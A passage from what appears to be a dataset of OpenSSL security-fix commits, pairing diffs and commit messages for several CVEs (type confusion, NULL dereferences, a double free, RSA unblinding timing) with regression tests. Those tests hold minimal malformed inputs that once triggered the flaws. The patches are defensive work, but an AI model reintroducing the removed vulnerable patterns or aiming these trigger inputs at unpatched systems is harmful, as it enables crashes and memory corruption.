  - "--- a/crypto/x509/v3_genn.c\n+++ b/crypto/x509/v3_genn.c\n@@ -98,7 +98,7 @@ int\
    \ GENERAL_NAME_cmp(GENERAL_NAME *a, GENERAL_NAME *b)\n         return -1;\n  \
    \   switch (a->type) {\n     case GEN_X400:\n-        result = ASN1_TYPE_cmp(a->d.x400Address,\
    \ b->d.x400Address);\n+        result = ASN1_STRING_cmp(a->d.x400Address, b->d.x400Address);\n\
    \         break;\n \n     case GEN_EDIPARTY:"
  - "--- a/test/v3nametest.c\n+++ b/test/v3nametest.c\n@@ -644,6 +644,14 @@ static\
    \ struct gennamedata {\n             0xb7, 0x09, 0x02, 0x02\n         },\n   \
    \      15\n+    }, {\n+        /*\n+         * Regression test for CVE-2023-0286.\n\
    +         */\n+        {\n+            0xa3, 0x00\n+        },\n+        2\n \
    \    }\n };\n "
  commit_message: 'Fix GENERAL_NAME_cmp for x400Address (master)


    CVE-2023-0286


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>'
  commit_sha: 7880536fe17c2b5450e279155bedd51771d28c9f
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/ffc/ffc_key_validate.c\n+++ b/crypto/ffc/ffc_key_validate.c\n@@\
    \ -24,6 +24,11 @@ int ossl_ffc_validate_public_key_partial(const FFC_PARAMS *params,\n\
    \     BN_CTX *ctx = NULL;\n \n     *ret = 0;\n+    if (params == NULL || pub_key\
    \ == NULL || params->p == NULL) {\n+        *ret = FFC_ERROR_PASSED_NULL_PARAM;\n\
    +        return 0;\n+    }\n+\n     ctx = BN_CTX_new_ex(NULL);\n     if (ctx ==\
    \ NULL)\n         goto err;\n@@ -107,6 +112,10 @@ int ossl_ffc_validate_private_key(const\
    \ BIGNUM *upper, const BIGNUM *priv,\n \n     *ret = 0;\n \n+    if (priv == NULL\
    \ || upper == NULL) {\n+        *ret = FFC_ERROR_PASSED_NULL_PARAM;\n+       \
    \ goto err;\n+    }\n     if (BN_cmp(priv, BN_value_one()) < 0) {\n         *ret\
    \ |= FFC_ERROR_PRIVKEY_TOO_SMALL;\n         goto err;"
  - "--- a/test/ffc_internal_test.c\n+++ b/test/ffc_internal_test.c\n@@ -510,6 +510,27\
    \ @@ static int ffc_public_validate_test(void)\n     if (!TEST_true(ossl_ffc_validate_public_key(params,\
    \ pub, &res)))\n         goto err;\n \n+    /* Fail if params is NULL */\n+  \
    \  if (!TEST_false(ossl_ffc_validate_public_key(NULL, pub, &res)))\n+        goto\
    \ err;\n+    if (!TEST_int_eq(FFC_ERROR_PASSED_NULL_PARAM, res))\n+        goto\
    \ err;\n+    res = -1;\n+    /* Fail if pubkey is NULL */\n+    if (!TEST_false(ossl_ffc_validate_public_key(params,\
    \ NULL, &res)))\n+        goto err;\n+    if (!TEST_int_eq(FFC_ERROR_PASSED_NULL_PARAM,\
    \ res))\n+        goto err;\n+    res = -1;\n+\n+    BN_free(params->p);\n+  \
    \  params->p = NULL;\n+    /* Fail if params->p is NULL */\n+    if (!TEST_false(ossl_ffc_validate_public_key(params,\
    \ pub, &res)))\n+        goto err;\n+    if (!TEST_int_eq(FFC_ERROR_PASSED_NULL_PARAM,\
    \ res))\n+        goto err;\n+\n     ret = 1;\n err:\n     DH_free(dh);\n@@ -567,6\
    \ +588,16 @@ static int ffc_private_validate_test(void)\n     if (!TEST_true(ossl_ffc_validate_private_key(params->q,\
    \ priv, &res)))\n         goto err;\n \n+    if (!TEST_false(ossl_ffc_validate_private_key(NULL,\
    \ priv, &res)))\n+        goto err;\n+    if (!TEST_int_eq(FFC_ERROR_PASSED_NULL_PARAM,\
    \ res))\n+        goto err;\n+    res = -1;\n+    if (!TEST_false(ossl_ffc_validate_private_key(params->q,\
    \ NULL, &res)))\n+        goto err;\n+    if (!TEST_int_eq(FFC_ERROR_PASSED_NULL_PARAM,\
    \ res))\n+        goto err;\n+\n     ret = 1;\n err:\n     DH_free(dh);"
  commit_message: 'Fix NULL deference when validating FFC public key.


    Fixes CVE-2023-0217


    When attempting to do a BN_Copy of params->p there was no NULL check.

    Since BN_copy does not check for NULL this is a NULL reference.


    As an aside BN_cmp() does do a NULL check, so there are other checks

    that fail because a NULL is passed. A more general check for NULL params

    has been added for both FFC public and private key validation instead.


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Matt Caswell <matt@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>'
  commit_sha: bcec03c33cc00a7b5eb89ebeeee59e604570a86a
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/pkcs7/pk7_lib.c\n+++ b/crypto/pkcs7/pk7_lib.c\n@@ -415,6 +415,8\
    \ @@ PKCS7_SIGNER_INFO *PKCS7_add_signature(PKCS7 *p7, X509 *x509, EVP_PKEY *pkey,\n\
    \ \n static STACK_OF(X509) *pkcs7_get_signer_certs(const PKCS7 *p7)\n {\n+   \
    \ if (p7->d.ptr == NULL)\n+        return NULL;\n     if (PKCS7_type_is_signed(p7))\n\
    \         return p7->d.sign->cert;\n     if (PKCS7_type_is_signedAndEnveloped(p7))\n\
    @@ -424,6 +426,8 @@ static STACK_OF(X509) *pkcs7_get_signer_certs(const PKCS7\
    \ *p7)\n \n static STACK_OF(PKCS7_RECIP_INFO) *pkcs7_get_recipient_info(const\
    \ PKCS7 *p7)\n {\n+    if (p7->d.ptr == NULL)\n+        return NULL;\n     if\
    \ (PKCS7_type_is_signedAndEnveloped(p7))\n         return p7->d.signed_and_enveloped->recipientinfo;\n\
    \     if (PKCS7_type_is_enveloped(p7))\n@@ -441,13 +445,17 @@ void ossl_pkcs7_resolve_libctx(PKCS7\
    \ *p7)\n     const PKCS7_CTX *ctx = ossl_pkcs7_get0_ctx(p7);\n     OSSL_LIB_CTX\
    \ *libctx = ossl_pkcs7_ctx_get0_libctx(ctx);\n     const char *propq = ossl_pkcs7_ctx_get0_propq(ctx);\n\
    -    STACK_OF(PKCS7_RECIP_INFO) *rinfos = pkcs7_get_recipient_info(p7);\n-   \
    \ STACK_OF(PKCS7_SIGNER_INFO) *sinfos = PKCS7_get_signer_info(p7);\n-    STACK_OF(X509)\
    \ *certs = pkcs7_get_signer_certs(p7);\n+    STACK_OF(PKCS7_RECIP_INFO) *rinfos;\n\
    +    STACK_OF(PKCS7_SIGNER_INFO) *sinfos;\n+    STACK_OF(X509) *certs;\n \n- \
    \   if (ctx == NULL)\n+    if (ctx == NULL || p7->d.ptr == NULL)\n         return;\n\
    \ \n+    rinfos = pkcs7_get_recipient_info(p7);\n+    sinfos = PKCS7_get_signer_info(p7);\n\
    +    certs = pkcs7_get_signer_certs(p7);\n+\n     for (i = 0; i < sk_X509_num(certs);\
    \ i++)\n         ossl_x509_set0_libctx(sk_X509_value(certs, i), libctx, propq);\n\
    \ "
  commit_message: 'Do not dereference PKCS7 object data if not set


    Fixes CVE-2023-0216


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Matt Caswell <matt@openssl.org>'
  commit_sha: 80253dbdc92bec584f4a9866b43f8674156d838a
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/test/pemtest.c\n+++ b/test/pemtest.c\n@@ -96,12 +96,42 @@ static int test_cert_key_cert(void)\n\
    \     return 1;\n }\n \n+static int test_empty_payload(void)\n+{\n+    BIO *b;\n\
    +    static char *emptypay =\n+        \"-----BEGIN CERTIFICATE-----\\n\"\n+ \
    \       \"-\\n\" /* Base64 EOF character */\n+        \"-----END CERTIFICATE-----\"\
    ;\n+    char *name = NULL, *header = NULL;\n+    unsigned char *data = NULL;\n\
    +    long len;\n+    int ret = 0;\n+\n+    b = BIO_new_mem_buf(emptypay, strlen(emptypay));\n\
    +    if (!TEST_ptr(b))\n+        return 0;\n+\n+    /* Expected to fail because\
    \ the payload is empty */\n+    if (!TEST_false(PEM_read_bio_ex(b, &name, &header,\
    \ &data, &len, 0)))\n+        goto err;\n+\n+    ret = 1;\n+ err:\n+    OPENSSL_free(name);\n\
    +    OPENSSL_free(header);\n+    OPENSSL_free(data);\n+    BIO_free(b);\n+   \
    \ return ret;\n+}\n+\n int setup_tests(void)\n {\n     if (!TEST_ptr(pemfile =\
    \ test_get_argument(0)))\n         return 0;\n     ADD_ALL_TESTS(test_b64, OSSL_NELEM(b64_pem_data));\n\
    \     ADD_TEST(test_invalid);\n     ADD_TEST(test_cert_key_cert);\n+    ADD_TEST(test_empty_payload);\n\
    \     return 1;\n }"
  commit_message: 'Add a test for CVE-2022-4450


    Call PEM_read_bio_ex() and expect a failure. There should be no dangling

    ptrs and therefore there should be no double free if we free the ptrs on

    error.


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>'
  commit_sha: dc341a46677fe19f055bd2eea0e3a2af21053903
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/pem/pem_lib.c\n+++ b/crypto/pem/pem_lib.c\n@@ -995,7 +995,9 @@ int\
    \ PEM_read_bio_ex(BIO *bp, char **name_out, char **header,\n \n out_free:\n  \
    \   PEM_FREE(*header, flags, 0);\n+    *header = NULL;\n     PEM_FREE(*data, flags,\
    \ 0);\n+    *data = NULL;\n end:\n     EVP_ENCODE_CTX_free(ctx);\n     PEM_FREE(name,\
    \ flags, 0);"
  commit_message: 'Avoid dangling ptrs in header and data params for PEM_read_bio_ex


    In the event of a failure in PEM_read_bio_ex() we free the buffers we

    allocated for the header and data buffers. However we were not clearing

    the ptrs stored in *header and *data. Since, on success, the caller is

    responsible for freeing these ptrs this can potentially lead to a double

    free if the caller frees them even on failure.


    Thanks to Dawei Wang for reporting this issue.


    Based on a proposed patch by Kurt Roeckx.


    CVE-2022-4450


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>'
  commit_sha: ee6243f3947107d655f6dee96f63861561a5aaeb
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/bn/bn_blind.c\n+++ b/crypto/bn/bn_blind.c\n@@ -13,20 +13,6 @@\n\
    \ \n #define BN_BLINDING_COUNTER     32\n \n-struct bn_blinding_st {\n-    BIGNUM\
    \ *A;\n-    BIGNUM *Ai;\n-    BIGNUM *e;\n-    BIGNUM *mod;                /*\
    \ just a reference */\n-    CRYPTO_THREAD_ID tid;\n-    int counter;\n-    unsigned\
    \ long flags;\n-    BN_MONT_CTX *m_ctx;\n-    int (*bn_mod_exp) (BIGNUM *r, const\
    \ BIGNUM *a, const BIGNUM *p,\n-                       const BIGNUM *m, BN_CTX\
    \ *ctx, BN_MONT_CTX *m_ctx);\n-    CRYPTO_RWLOCK *lock;\n-};\n-\n BN_BLINDING\
    \ *BN_BLINDING_new(const BIGNUM *A, const BIGNUM *Ai, BIGNUM *mod)\n {\n     BN_BLINDING\
    \ *ret = NULL;"
  - '--- a/crypto/bn/rsa_sup_mul.c

    +++ b/crypto/bn/rsa_sup_mul.c

    @@ -0,0 +1,604 @@

    +#include <openssl/e_os2.h>

    +#include <stddef.h>

    +#include <sys/types.h>

    +#include <string.h>

    +#include <openssl/bn.h>

    +#include <openssl/err.h>

    +#include <openssl/rsaerr.h>

    +#include "internal/endian.h"

    +#include "internal/numbers.h"

    +#include "internal/constant_time.h"

    +#include "bn_local.h"

    +

    +# if BN_BYTES == 8

    +typedef uint64_t limb_t;

    +#  if defined(__SIZEOF_INT128__) && __SIZEOF_INT128__ == 16

    +typedef uint128_t limb2_t;

    +#   define HAVE_LIMB2_T

    +#  endif

    +#  define LIMB_BIT_SIZE 64

    +#  define LIMB_BYTE_SIZE 8

    +# elif BN_BYTES == 4

    +typedef uint32_t limb_t;

    +typedef uint64_t limb2_t;

    +#  define LIMB_BIT_SIZE 32

    +#  define LIMB_BYTE_SIZE 4

    +#  define HAVE_LIMB2_T

    +# else

    +#  error "Not supported"

    +# endif

    +

    +/*

    + * For multiplication we''re using schoolbook multiplication,

    + * so if we have two numbers, each with 6 "digits" (words)

    + * the multiplication is calculated as follows:

    + *                        A B C D E F

    + *                     x  I J K L M N

    + *                     --------------

    + *                                N*F

    + *                              N*E

    + *                            N*D

    + *                          N*C

    + *                        N*B

    + *                      N*A

    + *                              M*F

    + *                            M*E

    + *                          M*D

    + *                        M*C

    + *                      M*B

    + *                    M*A

    + *                            L*F

    + *                          L*E

    + *                        L*D

    + *                      L*C

    + *                    L*B

    + *                  L*A

    + *                          K*F

    + *                        K*E

    + *                      K*D

    + *                    K*C

    + *                  K*B

    + *                K*A

    + *                        J*F

    + *                      J*E

    + *                    J*D

    + *                  J*C

    + *                J*B

    + *              J*A

    + *                      I*F

    + *                    I*E

    + *                  I*D

    + *                I*C

    + *              I*B

    + *         +  I*A

    + *         ==========================

    + *                        N*B N*D N*F

    + *                    + N*A N*C N*E

    + *                    + M*B M*D M*F

    + *                  + M*A M*C M*E

    + *                  + L*B L*D L*F

    + *                + L*A L*C L*E

    + *                + K*B K*D K*F

    + *              + K*A K*C K*E

    + *              + J*B J*D J*F

    + *            + J*A J*C J*E

    + *            + I*B I*D I*F

    + *          + I*A I*C I*E

    + *

    + *                1+1 1+3 1+5

    + *              1+0 1+2 1+4

    + *              0+1 0+3 0+5

    + *            0+0 0+2 0+4

    + *

    + *            0 1 2 3 4 5 6

    + * which requires n^2 multiplications and 2n full length additions

    + * as we can keep every other result of limb multiplication in two separate

    + * limbs

    + */

    +

    +#if defined HAVE_LIMB2_T

    +static ossl_inline void _mul_limb(limb_t *hi, limb_t *lo, limb_t a, limb_t b)

    +{

    +    limb2_t t;

    +    /*

    +     * this is idiomatic code to tell compiler to use the native mul

    +     * those three lines will actually compile to single instruction

    +     */

    +

    +    t = (limb2_t)a * b;

    +    *hi = t >> LIMB_BIT_SIZE;

    +    *lo = (limb_t)t;

    +}

    +#elif (BN_BYTES == 8) && (defined _MSC_VER)

    +/* https://learn.microsoft.com/en-us/cpp/intrinsics/umul128?view=msvc-170 */

    +#pragma intrinsic(_umul128)

    +static ossl_inline void _mul_limb(limb_t *hi, limb_t *lo, limb_t a, limb_t b)

    +{

    +    *lo = _umul128(a, b, hi);

    +}

    +#else

    +/*

    + * if the compiler doesn''t have either a 128bit data type nor a "return

    + * high 64 bits of multiplication"

    + */

    +static ossl_inline void _mul_limb(limb_t *hi, limb_t *lo, limb_t a, limb_t b)

    +{

    +    limb_t a_low = (limb_t)(uint32_t)a;

    +    limb_t a_hi = a >> 32;

    +    limb_t b_low = (limb_t)(uint32_t)b;

    +    limb_t b_hi = b >> 32;

    +

    +    limb_t p0 = a_low * b_low;

    +    limb_t p1 = a_low * b_hi;

    +    limb_t p2 = a_hi * b_low;

    +    limb_t p3 = a_hi * b_hi;

    +

    +    uint32_t cy = (uint32_t)(((p0 >> 32) + (uint32_t)p1 + (uint32_t)p2) >> 32);

    +

    +    *lo = p0 + (p1 << 32) + (p2 << 32);

    +    *hi = p3 + (p1 >> 32) + (p2 >> 32) + cy;

    +}

    +#endif

    +

    +/* add two limbs with carry in, return carry out */

    +static ossl_inline limb_t _add_limb(limb_t *ret, limb_t a, limb_t b, limb_t carry)

    +{

    +    limb_t carry1, carry2, t;

    +    /*

    +     * `c = a + b; if (c < a)` is idiomatic code that makes compilers

    +     * use add with carry on assembly level

    +     */

    +

    +    *ret = a + carry;

    +    if (*ret < a)

    +        carry1 = 1;

    +    else

    +        carry1 = 0;

    +

    +    t = *ret;

    +    *ret = t + b;

    +    if (*ret < t)

    +        carry2 = 1;

    +    else

    +        carry2 = 0;

    +

    +    return carry1 + carry2;

    +}

    +

    +/*

    + * add two numbers of the same size, return overflow

    + *

    + * add a to b, place result in ret; all arrays need to be n limbs long

    + * return overflow from addition (0 or 1)

    + */

    +static ossl_inline limb_t add(limb_t *ret, limb_t *a, limb_t *b, size_t n)

    +{

    +    limb_t c = 0;

    +    ossl_ssize_t i;

    +

    +    for(i = n - 1; i > -1; i--)

    +        c = _add_limb(&ret[i], a[i], b[i], c);

    +

    +    return c;

    +}

    +

    +/*

    + * return number of limbs necessary for temporary values

    + * when multiplying numbers n limbs large

    + */

    +static ossl_inline size_t mul_limb_numb(size_t n)

    +{

    +    return  2 * n * 2;

    +}

    +

    +/*

    + * multiply two numbers of the same size

    + *

    + * multiply a by b, place result in ret; a and b need to be n limbs long

    + * ret needs to be 2*n limbs long, tmp needs to be mul_limb_numb(n) limbs

    + * long

    + */

    +static void limb_mul(limb_t *ret, limb_t *a, limb_t *b, size_t n, limb_t *tmp)

    +{

    +    limb_t *r_odd, *r_even;

    +    size_t i, j, k;

    +

    +    r_odd = tmp;

    +    r_even = &tmp[2 * n];

    +

    +    memset(ret, 0, 2 * n * sizeof(limb_t));

    +

    +    for (i = 0; i < n; i++) {

    +        for (k = 0; k < i + n + 1; k++) {

    +            r_even[k] = 0;

    +            r_odd[k] = 0;

    +        }

    +        for (j = 0; j < n; j++) {

    +            /*

    +             * place results from even and odd limbs in separate arrays so that

    +             * we don''t have to calculate overflow every time we get individual

    +             * limb multiplication result

    +             */

    +            if (j % 2 == 0)

    +                _mul_limb(&r_even[i + j], &r_even[i + j + 1], a[i], b[j]);

    +            else

    +                _mul_limb(&r_odd[i + j], &r_odd[i + j + 1], a[i], b[j]);

    +        }

    +        /*

    +         * skip the least significant limbs when adding multiples of

    +         * more significant limbs (they''re zero anyway)

    +         */

    +        add(ret, ret, r_even, n + i + 1);

    +        add(ret, ret, r_odd, n + i + 1);

    +    }

    +}

    +

    +/* modifies the value in place by performing a right shift by one bit */

    +static ossl_inline void rshift1(limb_t *val, size_t n)

    +{

    +    limb_t shift_in = 0, shift_out = 0;

    +    size_t i;

    +

    +    for (i = 0; i < n; i++) {

    +        shift_out = val[i] & 1;

    +        val[i] = shift_in << (LIMB_BIT_SIZE - 1) | (val[i] >> 1);

    +        shift_in = shift_out;

    +    }

    +}

    +

    +/* extend the LSB of flag to all bits of limb */

    +static ossl_inline limb_t mk_mask(limb_t flag)

    +{

    +    flag |= flag << 1;

    +    flag |= flag << 2;

    +    flag |= flag << 4;

    +    flag |= flag << 8;

    +    flag |= flag << 16;

    +#if (LIMB_BYTE_SIZE == 8)

    +    flag |= flag << 32;

    +#endif

    +    return flag;

    +}

    +

    +/*

    + * copy from either a or b to ret based on flag

    + * when flag == 0, then copies from b

    + * when flag == 1, then copies from a

    + */

    +static ossl_inline void cselect(limb_t flag, limb_t *ret, limb_t *a, limb_t *b,
    size_t n)

    +{

    +    /*

    +     * would be more efficient with non volatile mask, but then gcc

    +     * generates code with jumps

    +     */

    +    volatile limb_t mask;

    +    size_t i;

    +

    +    mask = mk_mask(flag);

    +    for (i = 0; i < n; i++) {

    +#if (LIMB_BYTE_SIZE == 8)

    +        ret[i] = constant_time_select_64(mask, a[i], b[i]);

    +#else

    +        ret[i] = constant_time_select_32(mask, a[i], b[i]);

    +#endif

    +    }

    +}

    +

    +static limb_t _sub_limb(limb_t *ret, limb_t a, limb_t b, limb_t borrow)

    +{

    +    limb_t borrow1, borrow2, t;

    +    /*

    +     * while it doesn''t look constant-time, this is idiomatic code

    +     * to tell compilers to use the carry bit from subtraction

    +     */

    +

    +    *ret = a - borrow;

    +    if (*ret > a)

    +        borrow1 = 1;

    +    else

    +        borrow1 = 0;

    +

    +    t = *ret;

    +    *ret = t - b;

    +    if (*ret > t)

    +        borrow2 = 1;

    +    else

    +        borrow2 = 0;

    +

    +    return borrow1 + borrow2;

    +}

    +

    +/*

    + * place the result of a - b into ret, return the borrow bit.

    + * All arrays need to be n limbs long

    + */

    +static limb_t sub(limb_t *ret, limb_t *a, limb_t *b, size_t n)

    +{

    +    limb_t borrow = 0;

    +    ossl_ssize_t i;

    +

    +    for (i = n - 1; i > -1; i--)

    +        borrow = _sub_limb(&ret[i], a[i], b[i], borrow);

    +

    +    return borrow;

    +}

    +

    +/* return the number of limbs necessary to allocate for the mod() tmp operand
    */

    +static ossl_inline size_t mod_limb_numb(size_t anum, size_t modnum)

    +{

    +    return (anum + modnum) * 3;

    +}

    +

    +/*

    + * calculate a % mod, place the result in ret

    + * size of a is defined by anum, size of ret and mod is modnum,

    + * size of tmp is returned by mod_limb_numb()

    + */

    +static void mod(limb_t *ret, limb_t *a, size_t anum, limb_t *mod,

    +               size_t modnum, limb_t *tmp)

    +{

    +    limb_t *atmp, *modtmp, *rettmp;

    +    limb_t res;

    +    size_t i;

    +

    +    memset(tmp, 0, mod_limb_numb(anum, modnum) * LIMB_BYTE_SIZE);

    +

    +    atmp = tmp;

    +    modtmp = &tmp[anum + modnum];

    +    rettmp = &tmp[(anum + modnum) * 2];

    +

    +    for (i = modnum; i <modnum + anum; i++)

    +        atmp[i] = a[i-modnum];

    +

    +    for (i = 0; i < modnum; i++)

    +        modtmp[i] = mod[i];

    +

    +    for (i = 0; i < anum * LIMB_BIT_SIZE; i++) {

    +        rshift1(modtmp, anum + modnum);

    +        res = sub(rettmp, atmp, modtmp, anum+modnum);

    +        cselect(res, atmp, atmp, rettmp, anum+modnum);

    +    }

    +

    +    memcpy(ret, &atmp[anum], sizeof(limb_t) * modnum);

    +}

    +

    +/* necessary size of tmp for a _mul_add_limb() call with provided anum */

    +static ossl_inline size_t _mul_add_limb_numb(size_t anum)

    +{

    +    return 2 * (anum + 1);

    +}

    +

    +/* multiply a by m, add to ret, return carry */

    +static limb_t _mul_add_limb(limb_t *ret, limb_t *a, size_t anum,

    +                           limb_t m, limb_t *tmp)

    +{

    +    limb_t carry = 0;

    +    limb_t *r_odd, *r_even;

    +    size_t i;

    +

    +    memset(tmp, 0, sizeof(limb_t) * (anum + 1) * 2);

    +

    +    r_odd = tmp;

    +    r_even = &tmp[anum + 1];

    +

    +    for (i = 0; i < anum; i++) {

    +        /*

    +         * place the results from even and odd limbs in separate arrays

    +         * so that we have to worry about carry just once

    +         */

    +        if (i % 2 == 0)

    +            _mul_limb(&r_even[i], &r_even[i + 1], a[i], m);

    +        else

    +            _mul_limb(&r_odd[i], &r_odd[i + 1], a[i], m);

    +    }

    +    /* assert: add() carry here will be equal zero */

    +    add(r_even, r_even, r_odd, anum + 1);

    +    /*

    +     * while here it will not overflow as the max value from multiplication

    +     * is -2 while max overflow from addition is 1, so the max value of

    +     * carry is -1 (i.e. max int)

    +     */

    +    carry = add(ret, ret, &r_even[1], anum) + r_even[0];

    +

    +    return carry;

    +}

    +

    +static ossl_inline size_t mod_montgomery_limb_numb(size_t modnum)

    +{

    +    return modnum * 2 + _mul_add_limb_numb(modnum);

    +}

    +

    +/*

    + * calculate a % mod, place result in ret

    + * assumes that a is in Montgomery form with the R (Montgomery modulus) being

    + * smallest power of two big enough to fit mod and that''s also a power

    + * of the count of number of bits in limb_t (B).

    + * For calculation, we also need n'', such that mod * n'' == -1 mod B.

    + * anum must be <= 2 * modnum

    + * ret needs to be modnum words long

    + * tmp needs to be mod_montgomery_limb_numb(modnum) limbs long

    + */

    +static void mod_montgomery(limb_t *ret, limb_t *a, size_t anum, limb_t *mod,

    +                          size_t modnum, limb_t ni0, limb_t *tmp)

    +{

    +    limb_t carry, v;

    +    limb_t *res, *rp, *tmp2;

    +    ossl_ssize_t i;

    +

    +    res = tmp;

    +    /*

    +     * for intermediate result we need an integer twice as long as modulus

    +     * but keep the input in the least significant limbs

    +     */

    +    memset(res, 0, sizeof(limb_t) * (modnum * 2));

    +    memcpy(&res[modnum * 2 - anum], a, sizeof(limb_t) * anum);

    +    rp = &res[modnum];

    +    tmp2 = &res[modnum * 2];

    +

    +    carry = 0;

    +

    +    /* add multiples of the modulus to the value until R divides it cleanly */

    +    for (i = modnum; i > 0; i--, rp--) {

    +        v = _mul_add_limb(rp, mod, modnum, rp[modnum-1] * ni0, tmp2);

    +        v = v + carry + rp[-1];

    +        carry |= (v != rp[-1]);

    +        carry &= (v <= rp[-1]);

    +        rp[-1] = v;

    +    }

    +

    +    /* perform the final reduction by mod... */

    +    carry -= sub(ret, rp, mod, modnum);

    +

    +    /* ...conditionally */

    +    cselect(carry, ret, rp, ret, modnum);

    +}

    +

    +/* allocated buffer should be freed afterwards */

    +static void BN_to_limb(const BIGNUM *bn, limb_t *buf, size_t limbs)

    +{

    +    int i;

    +    int real_limbs = (BN_num_bytes(bn) + LIMB_BYTE_SIZE - 1) / LIMB_BYTE_SIZE;

    +    limb_t *ptr = buf + (limbs - real_limbs);

    +

    +    for (i = 0; i < real_limbs; i++)

    +         ptr[i] = bn->d[real_limbs - i - 1];

    +}

    +

    +#if LIMB_BYTE_SIZE == 8

    +static ossl_inline uint64_t be64(uint64_t host)

    +{

    +    uint64_t big = 0;

    +    DECLARE_IS_ENDIAN;

    +

    +    if (!IS_LITTLE_ENDIAN)

    +        return host;

    +

    +    big |= (host & 0xff00000000000000) >> 56;

    +    big |= (host & 0x00ff000000000000) >> 40;

    +    big |= (host & 0x0000ff0000000000) >> 24;

    +    big |= (host & 0x000000ff00000000) >>  8;

    +    big |= (host & 0x00000000ff000000) <<  8;

    +    big |= (host & 0x0000000000ff0000) << 24;

    +    big |= (host & 0x000000000000ff00) << 40;

    +    big |= (host & 0x00000000000000ff) << 56;

    +    return big;

    +}

    +

    +#else

    +/* Not all platforms have htobe32(). */

    +static ossl_inline uint32_t be32(uint32_t host)

    +{

    +    uint32_t big = 0;

    +    DECLARE_IS_ENDIAN;

    +

    +    if (!IS_LITTLE_ENDIAN)

    +        return host;

    +

    +    big |= (host & 0xff000000) >> 24;

    +    big |= (host & 0x00ff0000) >> 8;

    +    big |= (host & 0x0000ff00) << 8;

    +    big |= (host & 0x000000ff) << 24;

    +    return big;

    +}

    +#endif

    +

    +/*

    + * We assume that intermediate, possible_arg2, blinding, and ctx are used

    + * similar to BN_BLINDING_invert_ex() arguments.

    + * to_mod is RSA modulus.

    + * buf and num is the serialization buffer and its length.

    + *

    + * Here we use classic/Montgomery multiplication and modulo. After the calculation
    finished

    + * we serialize the new structure instead of BIGNUMs taking endianness into account.

    + */

    +int ossl_bn_rsa_do_unblind(const BIGNUM *intermediate,

    +                           const BN_BLINDING *blinding,

    +                           const BIGNUM *possible_arg2,

    +                           const BIGNUM *to_mod, BN_CTX *ctx,

    +                           unsigned char *buf, int num)

    +{

    +    limb_t *l_im = NULL, *l_mul = NULL, *l_mod = NULL;

    +    limb_t *l_ret = NULL, *l_tmp = NULL, l_buf;

    +    size_t l_im_count = 0, l_mul_count = 0, l_size = 0, l_mod_count = 0;

    +    size_t l_tmp_count = 0;

    +    int ret = 0;

    +    size_t i;

    +    unsigned char *tmp;

    +    const BIGNUM *arg1 = intermediate;

    +    const BIGNUM *arg2 = (possible_arg2 == NULL) ? blinding->Ai : possible_arg2;

    +

    +    l_im_count  = (BN_num_bytes(arg1)   + LIMB_BYTE_SIZE - 1) / LIMB_BYTE_SIZE;

    +    l_mul_count = (BN_num_bytes(arg2)   + LIMB_BYTE_SIZE - 1) / LIMB_BYTE_SIZE;

    +    l_mod_count = (BN_num_bytes(to_mod) + LIMB_BYTE_SIZE - 1) / LIMB_BYTE_SIZE;

    +

    +    l_size = l_im_count > l_mul_count ? l_im_count : l_mul_count;

    +    l_im  = OPENSSL_zalloc(l_size * LIMB_BYTE_SIZE);

    +    l_mul = OPENSSL_zalloc(l_size * LIMB_BYTE_SIZE);

    +    l_mod = OPENSSL_zalloc(l_mod_count * LIMB_BYTE_SIZE);

    +

    +    if ((l_im == NULL) || (l_mul == NULL) || (l_mod == NULL))

    +        goto err;

    +

    +    BN_to_limb(arg1,   l_im,  l_size);

    +    BN_to_limb(arg2,   l_mul, l_size);

    +    BN_to_limb(to_mod, l_mod, l_mod_count);

    +

    +    l_ret = OPENSSL_malloc(2 * l_size * LIMB_BYTE_SIZE);

    +

    +    if (blinding->m_ctx != NULL) {

    +        l_tmp_count = mul_limb_numb(l_size) > mod_montgomery_limb_numb(l_mod_count)
    ?

    +                      mul_limb_numb(l_size) : mod_montgomery_limb_numb(l_mod_count);

    +        l_tmp = OPENSSL_malloc(l_tmp_count * LIMB_BYTE_SIZE);

    +    } else {

    +        l_tmp_count = mul_limb_numb(l_size) > mod_limb_numb(2 * l_size, l_mod_count)
    ?

    +                      mul_limb_numb(l_size) : mod_limb_numb(2 * l_size, l_mod_count);

    +        l_tmp = OPENSSL_malloc(l_tmp_count * LIMB_BYTE_SIZE);

    +    }

    +

    +    if ((l_ret == NULL) || (l_tmp == NULL))

    +        goto err;

    +

    +    if (blinding->m_ctx != NULL) {

    +        limb_mul(l_ret, l_im, l_mul, l_size, l_tmp);

    +        mod_montgomery(l_ret, l_ret, 2 * l_size, l_mod, l_mod_count,

    +                       blinding->m_ctx->n0[0], l_tmp);

    +    } else {

    +        limb_mul(l_ret, l_im, l_mul, l_size, l_tmp);

    +        mod(l_ret, l_ret, 2 * l_size, l_mod, l_mod_count, l_tmp);

    +    }

    +

    +    /* modulus size in bytes can be equal to num but after limbs conversion it
    becomes bigger */

    +    if (num < BN_num_bytes(to_mod)) {

    +        ERR_raise(ERR_LIB_BN, ERR_R_PASSED_INVALID_ARGUMENT);

    +        goto err;

    +    }

    +

    +    memset(buf, 0, num);

    +    tmp = buf + num - BN_num_bytes(to_mod);

    +    for (i = 0; i < l_mod_count; i++) {

    +#if LIMB_BYTE_SIZE == 8

    +        l_buf = be64(l_ret[i]);

    +#else

    +        l_buf = be32(l_ret[i]);

    +#endif

    +        if (i == 0) {

    +            int delta = LIMB_BYTE_SIZE - ((l_mod_count * LIMB_BYTE_SIZE) - num);

    +

    +            memcpy(tmp, ((char *)&l_buf) + LIMB_BYTE_SIZE - delta, delta);

    +            tmp += delta;

    +        } else {

    +            memcpy(tmp, &l_buf, LIMB_BYTE_SIZE);

    +            tmp += LIMB_BYTE_SIZE;

    +        }

    +    }

    +    ret = num;

    +

    + err:

    +    OPENSSL_free(l_im);

